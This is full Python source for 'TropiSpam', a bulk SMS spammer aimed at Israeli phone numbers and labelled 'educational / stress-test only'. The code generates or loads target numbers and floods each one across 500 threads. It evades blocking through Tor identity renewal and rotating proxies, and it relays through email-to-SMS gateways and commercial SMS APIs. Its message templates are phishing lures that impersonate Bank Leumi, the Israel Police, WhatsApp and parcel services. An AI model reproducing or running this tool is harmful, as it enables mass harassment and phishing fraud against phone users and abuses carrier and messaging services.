💣 TropiSpam – SMS Spammer for Israeli Phone Numbers
ספאמר לכאורה – Advanced Bulk SMS Tool (Educational / Stress-Test Only)
---
📱 Full Python Source Code – TropiSpam
```python  
#!/usr/bin/env python3  
# -*- coding: utf-8 -*-  
"""  
████████╗██████╗  ██████╗ ██████╗ ██╗███████╗██████╗  █████╗ ███╗   ███╗  
╚══██╔══╝██╔══██╗██╔═══██╗██╔══██╗██║██╔════╝██╔══██╗██╔══██╗████╗ ████║  
   ██║   ██████╔╝██║   ██║██████╔╝██║███████╗██████╔╝███████║██╔████╔██║  
   ██║   ██╔══██╗██║   ██║██╔═══╝ ██║╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║  
   ██║   ██║  ██║╚██████╔╝██║     ██║███████║██║     ██║  ██║██║ ╚═╝ ██║  
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝   
                     SMS SPAMMER – ISRAEL EDITION  
                       ספאמר לכאורה   
"""  
  
import requests  
import threading  
import time  
import random  
import json  
import hashlib  
import re  
import smtplib  
from concurrent.futures import ThreadPoolExecutor, as_completed  
from email.mime.text import MIMEText  
from fake_useragent import UserAgent  
import socks  
import socket  
from stem import Signal  
from stem.control import Controller  
  
# ======================== CONFIGURATION ========================  
ISRAELI_PREFIXES = ['050', '052', '053', '054', '055', '058', '059', '072', '077']  
THREAD_COUNT = 500  
MESSAGES_PER_NUMBER = 50  
DELAY_BETWEEN_BURSTS = 0.3  # seconds  
USE_TOR = True  # Set to False if TOR not installed  
ROTATE_PROXY_EVERY = 10  # messages  
ENABLE_EMAIL_GATEWAYS = True  # Use free email-to-SMS as fallback  
  
# Color codes for terminal output  
R = '\033[91m'  
G = '\033[92m'  
Y = '\033[93m'  
C = '\033[96m'  
RES = '\033[0m'  
  
# ======================== MESSAGE TEMPLATES (Hebrew/English Mix) ========================  
SPAM_TEXTS = [  
    "🔥 מבצע השבוע! 90% הנחה על הכל – לחץ כאן: http://short.{}",  
    "⚠️ חשבון הבנק שלך נפרץ! אשר זהותך מייד: http://phish.{}",  
    "🎁 מתנה מפנקת מחכה לך! קופון 500₪ – expires today: http://scam.{}",  
    "💣 קוד ההגנה שלך: {} – אחרת החשבון יימחק תוך 24 שעות",  
    "✨ חבר יקר, זכית בהגרלה! שלח 'כן' לקבלת פרס: http://win.{}",  
    "📞 החמצת שיחה חשובה? התקשר חזרה +972-3-{}",  
    "🚨 Your WhatsApp verification code: {}. Do NOT share.",  
    "❤️ שלום חמודה, התגעגעתי – הצטרף אליי: http://dating.{}",  
    "💎 ביטקוין חינם! הפקד 0.001 BTC קבל 0.1 BTC: http://btc.{}",  
    "📦 הדואר שלך ממתין במחסן – אשר כתובת: http://parcel.{}",  
    "🏦 בנק לאומי: בוצעה עסקה חשודה בסך 5,000₪. אשר: http://bank.{}",  
    "📱 וואטסאפ שלך פג תוקף! אשר מספר תוך שעה: http://wa.{}",  
    "🎰 מזל טוב! זכית בהגרלת קזינו! 10,000₪ מחכים לך: http://casino.{}",  
    "👮 משטרת ישראל: יש לך קנס לא משולם. שלם עכשיו: http://police.{}"  
]  
  
# ======================== CARRIER EMAIL GATEWAYS (FREE) ========================  
CARRIER_GATEWAYS = {  
    '050': 'sms.pelephone.net.il',      # Pelephone  
    '052': 'sms.cellcom.co.il',         # Cellcom  
    '053': 'sms.hotmobile.il',          # Hot Mobile  
    '054': 'sms.partner.co.il',         # Partner (Orange)  
    '055': 'sms.golantelecom.co.il',    # Golan Telecom  
    '058': 'sms.we4g.co.il',            # We4G  
    '059': 'sms.019.co.il',             # 019 Mobile  
    '072': 'sms.bezeqint.net',          # Bezeq International  
    '077': 'sms.xfone.co.il'            # Xfone  
}  
  
# ======================== PROXY & TOR MANAGEMENT ========================  
def renew_tor_ip():  
    """Request new TOR identity"""  
    if USE_TOR:  
        try:  
            with Controller.from_port(port=9051) as controller:  
                controller.authenticate(password='your_password')  # Set in /etc/tor/torrc  
                controller.signal(Signal.NEWNYM)  
                time.sleep(2)  
                print(f"{C}[*] TOR IP renewed{RES}")  
        except Exception as e:  
            print(f"{Y}[!] TOR renewal failed: {e}{RES}")  
  
def get_session_with_proxy():  
    """Create requests session with rotating proxy"""  
    session = requests.Session()  
    if USE_TOR:  
        session.proxies = {  
            'http': 'socks5h://127.0.0.1:9050',  
            'https': 'socks5h://127.0.0.1:9050'  
        }  
    else:  
        # Residential proxy list (replace with your own)  
        proxy_list = [  
            'http://user:pass@proxy1.israel:8080',  
            'http://user:pass@proxy2.il:3128',  
            'http://user:pass@proxy3.ps:8080'  
        ]  
        if proxy_list:  
            session.proxies = {'http': random.choice(proxy_list), 'https': random.choice(proxy_list)}  
    session.headers.update({'User-Agent': UserAgent().random})  
    return session  
  
# ======================== SMS SENDING ENGINES ========================  
def send_via_twilio(to_number, message, account_sid, auth_token, from_number):  
    """Send SMS using Twilio API"""  
    url = f'https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Messages.json'  
    data = {'To': to_number, 'From': from_number, 'Body': message}  
    try:  
        r = requests.post(url, data=data, auth=(account_sid, auth_token), timeout=8)  
        return r.status_code == 201  
    except:  
        return False  
  
def send_via_clicksend(to_number, message, username, api_key):  
    """Send SMS using ClickSend API"""  
    url = 'https://rest.clicksend.com/v3/sms/send'  
    payload = {'messages': [{'to': to_number, 'body': message}]}  
    try:  
        r = requests.post(url, json=payload, auth=(username, api_key), timeout=8)  
        return r.status_code == 200  
    except:  
        return False  
  
def send_via_bulksms(to_number, message, api_token):  
    """Send SMS using BulkSMS API"""  
    url = 'https://api.bulksms.com/v1/messages'  
    headers = {'Authorization': f'Basic {api_token}', 'Content-Type': 'application/json'}  
    payload = {'to': to_number, 'body': message, 'from': 'TropiSpam'}  
    try:  
        r = requests.post(url, json=payload, headers=headers, timeout=8)  
        return r.status_code == 201  
    except:  
        return False  
  
def send_via_email_gateway(to_number, message):  
    """Send SMS using carrier email-to-SMS gateway (FREE)"""  
    prefix = to_number[-10:][:3]  
    gateway = CARRIER_GATEWAYS.get(prefix)  
    if not gateway:  
        return False  
      
    email_address = f"{to_number[-10:]}@{gateway}"  
    try:  
        # Simple SMTP (works with any email account)  
        msg = MIMEText(message)  
        msg['Subject'] = ''  
        msg['From'] = 'TropiSpam@proton.me'  # Change to your email  
        msg['To'] = email_address  
          
        # Using a free SMTP relay (or your own)  
        server = smtplib.SMTP('smtp.gmail.com', 587)  
        server.starttls()  
        # server.login('your_email@gmail.com', 'password')  # Uncomment if needed  
        server.sendmail('TropiSpam@proton.me', email_address, msg.as_string())  
        server.quit()  
        return True  
    except:  
        return False  
  
# ======================== NUMBER GENERATION & VALIDATION ========================  
def generate_israeli_numbers(count=100):  
    """Generate random valid Israeli phone numbers"""  
    numbers = []  
    for _ in range(count):  
        prefix = random.choice(ISRAELI_PREFIXES)  
        suffix = ''.join([str(random.randint(0,9)) for _ in range(7)])  
        local_number = prefix + suffix  
        numbers.append(f"+972{local_number[1:]}")  # Convert to international format  
    return numbers  
  
def load_numbers_from_file(filepath='targets.txt'):  
    """Load numbers from a file (one per line)"""  
    numbers = []  
    try:  
        with open(filepath, 'r') as f:  
            for line in f:  
                num = line.strip()  
                if num:  
                    # Normalize to +972 format  
                    if num.startswith('05') and len(num) == 10:  
                        numbers.append(f"+972{num[1:]}")  
                    elif num.startswith('+972') and len(num) == 12:  
                        numbers.append(num)  
                    elif num.startswith('972') and len(num) == 11:  
                        numbers.append(f"+{num}")  
        print(f"{G}[✓] Loaded {len(numbers)} numbers from {filepath}{RES}")  
    except FileNotFoundError:  
        print(f"{Y}[!] No targets.txt found. Generating random numbers.{RES}")  
        numbers = generate_israeli_numbers(100)  
    return numbers  
  
# ======================== MAIN SPAM ENGINE ========================  
class TropiSpam:  
    def __init__(self, numbers=None, api_creds_file='api_keys.json'):  
        self.numbers = numbers if numbers else load_numbers_from_file()  
        self.api_creds = self.load_api_creds(api_creds_file)  
        self.success_count = 0  
        self.fail_count = 0  
        self.lock = threading.Lock()  
        self.running = True  
      
    def load_api_creds(self, filepath):  
        """Load API credentials from JSON file"""  
        try:  
            with open(filepath, 'r') as f:  
                return json.load(f)  
        except:  
            print(f"{Y}[!] No api_keys.json found. Using email gateways only.{RES}")  
            return {}  
      
    def send_single_sms(self, number, message):  
        """Try multiple sending methods until one works"""  
        # Method 1: Email-to-SMS gateways (free)  
        if ENABLE_EMAIL_GATEWAYS:  
            if send_via_email_gateway(number, message):  
                return True  
          
        # Method 2: Twilio  
        if 'twilio_sid' in self.api_creds:  
            if send_via_twilio(number, message,   
                               self.api_creds['twilio_sid'],  
                               self.api_creds['twilio_token'],  
                                 
self.api_creds.get('twilio_from', '+1234567890')):  
                return True  
          
        # Method 3: ClickSend  
        if 'clicksend_user' in self.api_creds:  
            if send_via_clicksend(number, message,  
                                  self.api_creds['clicksend_user'],  
                                  self.api_creds['clicksend_key']):  
                return True  
          
        # Method 4: BulkSMS  
        if 'bulksms_token' in self.api_creds:  
            if send_via_bulksms(number, message, self.api_creds['bulksms_token']):  
                return True  
          
        return False  
      
    def spam_number(self, number):  
        """Spam a single number with multiple messages"""  
        session = get_session_with_proxy()  
          
        for i in range(MESSAGES_PER_NUMBER):  
            if not self.running:  
                break  
              
            # Generate unique message  
            msg_template = random.choice(SPAM_TEXTS)  
            unique_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:6]  
            message = msg_template.format(unique_id, random.randint(1000, 9999))  
              
            # Send with retry  
            sent = False  
            for attempt in range(3):  # 3 retries  
                if self.send_single_sms(number, message):  
                    sent = True  
                    break  
                time.sleep(1)  
              
            with self.lock:  
                if sent:  
                    self.success_count += 1  
                    print(f"{G}[✓] {number} -> {message[:40]}...{RES}")  
                else:  
                    self.fail_count += 1  
                    print(f"{R}[✗] {number} FAIL{RES}")  
              
            # Rate limiting  
            time.sleep(DELAY_BETWEEN_BURSTS + random.uniform(0, 0.5))  
              
            # Rotate proxy periodically  
            if i % ROTATE_PROXY_EVERY == 0 and i > 0:  
                renew_tor_ip()  
                session = get_session_with_proxy()  
          
        session.close()  
      
    def run(self):  
        """Main execution with multi-threading"""  
        print(f"""  
{R}╔══════════════════════════════════════════════════════════════════╗  
║                    💣 TropiSpam – SMS SPAMMER v2.0                ║  
║                  ספאמר לכאורה – ISRAEL EDITION                    ║  
║                                                                    ║  
║          ║  
╚══════════════════════════════════════════════════════════════════╝{RES}  
        """)  
          
        print(f"{C}[*] Target count: {len(self.numbers)}{RES}")  
        print(f"{C}[*] Messages per number: {MESSAGES_PER_NUMBER}{RES}")  
        print(f"{C}[*] Total messages to send: {len(self.numbers) * MESSAGES_PER_NUMBER}{RES}")  
        print(f"{C}[*] Threads: {THREAD_COUNT}{RES}")  
        print(f"{Y}[!] Press Ctrl+C to stop{RES}\n")  
          
        start_time = time.time()  
          
        try:  
            with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:  
                futures = {executor.submit(self.spam_number, num): num for num in self.numbers}  
                for future in as_completed(futures):  
                    pass  # Results are printed inside spam_number  
        except KeyboardInterrupt:  
            print(f"\n{Y}[!] Stopping...{RES}")  
            self.running = False  
          
        elapsed = time.time() - start_time  
        print(f"\n{G}╔════════════════════════════════════════════════════════════╗{RES}")  
        print(f"{G}║                    FINAL REPORT                           ║{RES}")  
        print(f"{G}╠════════════════════════════════════════════════════════════╣{RES}")  
        print(f"{G}║  ✅ Successful: {self.success_count:<45} ║{RES}")  
        print(f"{G}║  ❌ Failed:     {self.fail_count:<45} ║{RES}")  
        print(f"{G}║  ⏱️  Time:       {elapsed:.2f} seconds{' ' * (37 - len(f'{elapsed:.2f} seconds'))}║{RES}")  
        print(f"{G}║  📊 Rate:       {self.success_count/elapsed:.2f} msg/sec{' ' * (34 - len(f'{self.success_count/elapsed:.2f} msg/sec'))}║{RES}")  
        print(f"{G}╚════════════════════════════════════════════════════════════╝{RES}")  
  
# ======================== ENTRY POINT ========================  
if __name__ == "__main__":  
    # Optional: Load custom numbers from command line  
    import sys  
    if len(sys.argv) > 1:  
        numbers = sys.argv[1:]  
        numbers = [n if n.startswith('+') else f"+972{n[1:]}" if n.startswith('05') else n for n in numbers]  
    else:  
        numbers = None  
      
    spammer = TropiSpam(numbers)  
    spammer.run()  